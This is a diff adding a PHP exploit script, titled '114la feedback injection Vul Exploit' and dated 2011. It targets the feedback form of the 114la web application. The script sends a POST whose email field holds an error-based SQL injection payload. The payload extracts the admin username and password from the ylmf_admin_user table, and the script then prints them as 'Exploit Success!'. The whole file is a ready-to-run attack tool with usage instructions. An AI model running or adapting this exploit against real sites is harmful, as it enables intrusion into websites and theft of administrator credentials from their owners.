@@ -1,0 +1,59 @@
+<?php
+$sbcopyright='
+----------------------------------------
+114la feedback injection Vul Exploit
+By xZL
+Team: oke
+2011.04.02
+
+Usage: php '.$argv[0].' host /path
+Example: php '.$argv[0].' 127.0.0.1 /
+----------------------------------------
+';
+if ($argc < 3) {
+print_r($sbcopyright);
+die();
+}
+
+ob_start();
+$url = $argv[1];
+$path= $argv[2];
+
+$sock = fsockopen("$url", 80, $errno, $errstr, 30);
+if (!$sock) die("$errstr ($errno)\n");
+$data = "username=0kee%E7%B8%97'&email=,0,(select%201%20from%20(select%20count(*),concat((SELECT%20concat(name,0x5f,password)%20FROM%20ylmf_admin_user limit 0,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a),2)#&content=~~~~~this is a test from 0kee security team~~~~~";
+
+fwrite($sock, "POST $path/feedback/feedback.php HTTP/1.1\r\n");
+fwrite($sock, "Accept: */*\r\n");
+fwrite($sock, "Referer: http://$url/#M\r\n");
+fwrite($sock, "Accept-Language: zh-cn\r\n");
+fwrite($sock, "Content-Type: application/x-www-form-urlencoded\r\n");
+fwrite($sock, "Accept-Encoding: gzip, deflate\r\n");
+fwrite($sock, "User-Agent: Mozilla\r\n");
+fwrite($sock, "Host: $url\r\n");
+fwrite($sock, "Content-Length: ".strlen($data)."\r\n");
+fwrite($sock, "Connection: Keep-Alive\r\n");
+fwrite($sock, "Cache-Control: no-cache\r\n");
+fwrite($sock, "Cookie:ASPSESSIONIDASDRRBRA=MFILAMMAENMDGAPJLLKPEAON\r\n\r\n");
+fwrite($sock, $data);
+
+$headers = "";
+while ($str = trim(fgets($sock, 4096)))
+$headers .= "$str\n";
+echo "\n";
+$body = "";
+while (!feof($sock))
+$body .= fgets($sock, 4096);
+
+fclose($sock);
+
+if (strpos($body, 'Duplicate entry') !== false) {
+preg_match('/Duplicate entry \'(.*)1\'/', $body, $arr);
+$result=explode("_",$arr[1]);
+print_r("Exploit Success! \nusername:".$result[0]."\npassword:".$result[1]."\nGood Luck!");
+}else{
+print_r("Exploit Failed! \n");
+}
+
+ob_end_flush();
+?>
